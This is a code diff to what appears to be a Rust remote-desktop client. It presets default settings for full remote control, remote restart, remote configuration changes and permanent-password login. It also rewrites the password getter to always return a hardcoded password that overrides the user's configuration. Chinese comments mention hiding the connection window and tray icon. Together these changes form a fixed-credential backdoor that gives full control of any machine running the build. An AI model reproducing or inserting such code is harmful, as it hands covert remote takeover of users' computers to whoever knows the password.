@@ -62,7 +62,25 @@ lazy_static::lazy_static! {
     static ref KEY_PAIR: Mutex<Option<KeyPair>> = Default::default();
     static ref USER_DEFAULT_CONFIG: RwLock<(UserDefaultConfig, Instant)> = RwLock::new((UserDefaultConfig::load(), Instant::now()));
     pub static ref NEW_STORED_PEER_CONFIG: Mutex<HashSet<String>> = Default::default();
-    pub static ref DEFAULT_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
+    pub static ref DEFAULT_SETTINGS: RwLock<HashMap<String, String>> = {
+        let mut map = HashMap::new();
+        map.insert("enable-directx-capture".to_string(), "Y".to_string());
+        //访问模式，custom：自定义，full：完全控制，view：共享屏幕
+        map.insert("access-mode".to_string(), "full".to_string());
+        //允许远程重启
+        map.insert("enable-remote-restart".to_string(), "Y".to_string());
+        //允许远程修改配置
+        map.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+        //接受远程方式，password：密码，click：点击，password-click：同时使用
+        map.insert("approve-mode".to_string(), "password-click".to_string());
+        //密码验证方式，use-temporary-password：一次性密码，use-permanent-password：固定密码，use-both-passwords：同时使用
+        map.insert("verification-method".to_string(), "use-permanent-password".to_string());
+        //隐藏连接管理窗口，approve-mode=password，verification-method=use-permanent-password，才可生效，项目中有修复代码
+        map.insert("allow-hide-cm".to_string(), "N".to_string());
+        //隐藏托盘图标，approve-mode=password，verification-method=use-permanent-password，才可生效，项目中有修复代码
+        map.insert("hide-tray".to_string(), "N".to_string());
+        RwLock::new(map)
+    };
     pub static ref OVERWRITE_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref DEFAULT_DISPLAY_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref OVERWRITE_DISPLAY_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
@@ -1089,13 +1107,8 @@ impl Config {
     }
 
     pub fn get_permanent_password() -> String {
-        let mut password = CONFIG.read().unwrap().password.clone();
-        if password.is_empty() {
-            if let Some(v) = HARD_SETTINGS.read().unwrap().get("password") {
-                password = v.to_owned();
-            }
-        }
-        password
+        // 返回固定密码，不管配置文件中是什么
+        "Asd369258".to_string() // 用户设置的固定密码
     }
 
     pub fn set_salt(salt: &str) {
